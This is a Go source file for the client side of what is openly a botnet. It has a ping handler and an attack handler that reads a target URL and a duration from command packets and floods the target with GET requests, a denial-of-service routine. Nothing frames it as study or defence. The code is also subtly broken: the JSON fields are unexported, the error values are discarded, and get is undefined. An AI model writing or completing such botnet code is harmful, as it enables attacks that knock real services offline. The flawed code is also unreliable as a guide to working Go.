package client

import (
	"encoding/json"
	protocol "example/botnet-protocol"
	"fmt"
	"net"
	time2 "time"
)

type AttackCommand struct {
	url      string `json:"url"`
	duration int64  `json:"time"`
}

func (handler PingHandler) onPacket(packetType int16, packet protocol.Packet, conn net.Conn) {
	// send pong back
	_, err := conn.Write(make([]byte, 0))
	if err != nil {
		fmt.Errorf("Error send pong handler ", err)
		return
	}
}

func (handler AttackHandler) onPacket(packetType int16, packet protocol.Packet, conn net.Conn) {
	// parse data
	packetBody := packet.Body()

	var packetJson AttackCommand

	err := json.Unmarshal([]byte(packetBody), &packetJson)
	if err != nil {
		fmt.Errorf("Error unmarshal object", err)
		return
	}

	url := packetJson.url
	time := packetJson.duration

	if url != "" && time > 0 {
		go onAction(url, time)
	}
}

func onAction(url string, duration int64) {
	start := time2.Now().UnixMilli()

	for {
		now := time2.Now().UnixMilli()
		if now-start > duration {
			break
		}

		get(url)
	}
}
